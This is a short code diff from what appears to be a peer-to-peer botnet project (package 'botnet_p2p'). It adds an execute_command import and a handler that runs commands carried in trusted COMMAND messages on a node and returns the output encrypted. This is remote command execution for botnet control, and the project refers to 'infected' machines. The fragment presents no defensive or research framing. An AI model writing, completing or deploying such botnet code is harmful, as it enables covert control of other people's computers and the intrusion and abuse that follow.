@@ -4,7 +4,7 @@ import logging
 import threading
 
 from botnet_p2p.comm_utils import NodeP2P
-from botnet_p2p.operations import add_new_infected_machine
+from botnet_p2p.operations import add_new_infected_machine, execute_command
 
 logging.basicConfig(level=logging.DEBUG)
 
@@ -18,7 +18,7 @@ UPDATE_FILE = 4
 SERVER_HOST = "localhost"
 SERVER_PORT = 50000
 MAX_QUEUE = 4
-
+    
 
 logging.info("Starting server ...")
 server_socket = NodeP2P()
@@ -48,6 +48,9 @@ def talk_with_client(client_socket: NodeP2P) -> None:
     else:
         if trusted:
             logging.info("The message is trusted")
+            if msg_type == COMMAND:
+                output = execute_command(msg)
+                client_socket.send_encrypted_msg(output)
         else:
             logging.info("Someone is trying to break in")
 
